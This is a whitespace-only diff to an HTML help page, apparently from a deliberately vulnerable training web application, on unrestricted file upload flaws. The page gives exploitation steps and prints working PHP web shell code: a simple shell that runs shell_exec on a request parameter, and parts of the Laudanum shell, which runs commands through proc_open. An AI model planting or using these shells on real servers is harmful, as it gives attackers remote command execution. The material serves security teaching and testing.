@@ -1,7 +1,7 @@
 			<br/><br/>
 			<span class="report-header">Overview</span>
 			<br/><br/>
-			Unrestricted File Upload may result when applications fail to 
+			Unrestricted File Upload may result when applications fail to
 			restrict and validate file uploads using server side controls.
 			It may be possible to upload mallicious files and/or files containing
 			shell code. Denial of service attacks may also occur if the available
@@ -20,32 +20,32 @@
 			<br/><br/>
 			On sites which allow files to be uploaded within a web directory,
 			it should be possible to execute the web shell by browsing to this
-			file. 
+			file.
 			<br/><br/>
 			Check all available input parameters exposed to the client in order
 			to control aspects of the file upload process. Look for parameters
-			that control maximum file size and file upload location. 
+			that control maximum file size and file upload location.
 			<br/><br/>
 			<span class="report-header">Exploitation</span>
 			<br/><br/>
-			On pages which allow file uploads, upload a web shell. Attempt to 
+			On pages which allow file uploads, upload a web shell. Attempt to
 			determine if the shell can be executed by browsing to that page.
 			<br/><br/>
-			If files are uploaded outside of the web root, attempt to take 
+			If files are uploaded outside of the web root, attempt to take
 			advantage. Possibilities will vary based on the context.
 			<br/><br/>
-			Try to determine if it is possible to choose or influence the 
+			Try to determine if it is possible to choose or influence the
 			directory into which the file is uploaded. For example, some
 			sites will place files into a folder based on the user account
 			name. It may be possible to influence the file location by
-			altering available inputs. 
+			altering available inputs.
 			<br/><br/>
 			<span class="report-header">Example: Simple Shell</span>
 			<br/><br/>
 			Copy and paste shell code into a file. Upload the file. Browse to
 			the file location.
 			<br/>
-<code>			
+<code>
 &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt;
 	&lt;table style=&quot;margin-left:auto; margin-right:auto;&quot;&gt;
 		&lt;tr&gt;
@@ -66,14 +66,14 @@
 		&lt;/tr&gt;
 	&lt;/table&gt;
 &lt;/form&gt;
-&lt;?php 
+&lt;?php
 	if (isset($_REQUEST[&quot;pCommand&quot;])) {
 		echo &quot;&lt;pre&gt;&quot;;
 		echo shell_exec($_REQUEST[&quot;pCommand&quot;]);
 		echo &quot;&lt;/pre&gt;&quot;;
 	}//end if
 ?&gt;
-	
+
 </code>
 			<br/><br/>
 			<span class="report-header">Example: Laudanum Shell</span>
@@ -111,12 +111,12 @@
 *** modify it under the terms of the GNU General Public License
 *** as published by the Free Software Foundation; either version 2
 *** of the License, or (at your option) any later version.
-*** 
+***
 *** This program is distributed in the hope that it will be useful,
 *** but WITHOUT ANY WARRANTY; without even the implied warranty of
 *** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *** GNU General Public License for more details.
-*** 
+***
 *** You can get a copy of the GNU General Public License from this
 *** address: http://www.gnu.org/copyleft/gpl.html#SEC1
 *** You can also write to the Free Software Foundation, Inc., 59 Temple
@@ -129,7 +129,7 @@
 // IPs are enterable as individual addresses TODO: add CIDR support
 $allowedIPs = array(&quot;192.168.1.55&quot;, &quot;12.2.2.2&quot;);
 
-# format is &quot;username&quot; =&gt; &quot;password&quot; 
+# format is &quot;username&quot; =&gt; &quot;password&quot;
 # password is generated using sha1sum as shown below (don&#39;t forget the -n, KEVIN!)
 # echo -n  Password1 | sha1sum
 $users = array(&quot;kevin&quot; =&gt; &quot;b441ac06613fc8d63795be9ad0beaf55011936ac&quot;, &quot;tim&quot; =&gt; &quot;a94a1fe5ccb19ba61c4c0873d391e987982fbbd3&quot;, &quot;yomamma&quot; =&gt; &quot;a94a1fe5ccb19ba61c4c0873d391e987982fbbd3&quot;);
@@ -216,7 +216,6 @@ $columns  = isset($_POST[&#39;columns&#39;])  ? $_POST[&#39;columns&#39;]  : 80;
 ///* Merge settings. */
 //$ini[&#39;settings&#39;] = array_merge($default_settings, $ini[&#39;settings&#39;]);
 
-
 session_start();
 
 /* Delete the session data if the user requested a logout.  This leaves the
@@ -226,7 +225,7 @@ if (isset($_POST[&#39;logout&#39;]))
     logout();
 
 ///* Attempt authentication. */
-//if (isset($_SESSION[&#39;nounce&#39;]) &amp;&amp; $nounce == $_SESSION[&#39;nounce&#39;] &amp;&amp; 
+//if (isset($_SESSION[&#39;nounce&#39;]) &amp;&amp; $nounce == $_SESSION[&#39;nounce&#39;] &amp;&amp;
 //    isset($ini[&#39;users&#39;][$username])) {
 //    if (strchr($ini[&#39;users&#39;][$username], &#39;:&#39;) === false) {
 //        // No seperator found, assume this is a password in clear text.
@@ -246,23 +245,23 @@ if (isset($_SESSION[&#39;nounce&#39;]) &amp;&amp; $nounce == $_SESSION[&#39;noun
 if (!isset($_SESSION[&#39;authenticated&#39;]))
     $_SESSION[&#39;authenticated&#39;] = false;
 
-if ($_SESSION[&#39;authenticated&#39;]) {  
+if ($_SESSION[&#39;authenticated&#39;]) {
     /* Initialize the session variables. */
     if (empty($_SESSION[&#39;cwd&#39;])) {
         $_SESSION[&#39;cwd&#39;] = &#39;.&#39;;
         $_SESSION[&#39;history&#39;] = array();
         $_SESSION[&#39;output&#39;] = &#39;&#39;;
     }
-  
+
     if (!empty($command)) {
         /* Save the command for late use in the JavaScript.  If the command is
          * already in the history, then the old entry is removed before the
          * new entry is put into the list at the front. */
         if (($i = array_search($command, $_SESSION[&#39;history&#39;])) !== false)
             unset($_SESSION[&#39;history&#39;][$i]);
-        
+
         array_unshift($_SESSION[&#39;history&#39;], $command);
-  
+
         /* Now append the commmand to the output. */
         $_SESSION[&#39;output&#39;] .= &#39;$ &#39; . $command . &quot;\n&quot;;
 
@@ -281,7 +280,7 @@ if ($_SESSION[&#39;authenticated&#39;]) {
                  * directory. */
                 $new_dir = $_SESSION[&#39;cwd&#39;] . &#39;/&#39; . $regs[1];
             }
-      
+
             /* Transform &#39;/./&#39; into &#39;/&#39; */
             while (strpos($new_dir, &#39;/./&#39;) !== false)
                 $new_dir = str_replace(&#39;/./&#39;, &#39;/&#39;, $new_dir);
@@ -293,16 +292,16 @@ if ($_SESSION[&#39;authenticated&#39;]) {
             /* Transform &#39;x/..&#39; into &#39;&#39; */
             while (preg_match(&#39;|/\.\.(?!\.)|&#39;, $new_dir))
                 $new_dir = preg_replace(&#39;|/?[^/]+/\.\.(?!\.)|&#39;, &#39;&#39;, $new_dir);
-      
+
             if ($new_dir == &#39;&#39;) $new_dir = &#39;/&#39;;
-      
+
             /* Try to change directory. */
             if (@chdir($new_dir)) {
                 $_SESSION[&#39;cwd&#39;] = $new_dir;
             } else {
                 $_SESSION[&#39;output&#39;] .= &quot;cd: could not change to: $new_dir\n&quot;;
             }
-      
+
         } elseif (trim($command) == &#39;exit&#39;) {
             logout();
         } else {
@@ -323,7 +322,7 @@ if ($_SESSION[&#39;authenticated&#39;]) {
             $token = substr($command, 0, $length);
             if (isset($ini[&#39;aliases&#39;][$token]))
                 $command = $ini[&#39;aliases&#39;][$token] . substr($command, $length);
-    
+
             $io = array();
             $p = proc_open($command,
                            array(1 =&gt; array(&#39;pipe&#39;, &#39;w&#39;),
@@ -340,7 +339,7 @@ if ($_SESSION[&#39;authenticated&#39;]) {
                 $_SESSION[&#39;output&#39;] .= htmlspecialchars(fgets($io[2]),
                                                         ENT_COMPAT, &#39;UTF-8&#39;);
             }
-            
+
             fclose($io[1]);
             fclose($io[2]);
             proc_close($p);
@@ -468,7 +467,7 @@ echo rtrim($padding . $_SESSION[&#39;output&#39;]);
   maxlength=&quot;3&quot; value=&quot;&lt;?php echo $rows ?&gt;&quot;&gt; &amp;times; &lt;input type=&quot;text&quot;
   name=&quot;columns&quot; size=&quot;2&quot; maxlength=&quot;3&quot; value=&quot;&lt;?php echo $columns
   ?&gt;&quot;&gt;&lt;/span&gt;
-  
+
 &lt;input type=&quot;submit&quot; value=&quot;Execute Command&quot;&gt;
   &lt;input type=&quot;submit&quot; name=&quot;logout&quot; value=&quot;Logout&quot;&gt;
 &lt;/p&gt;
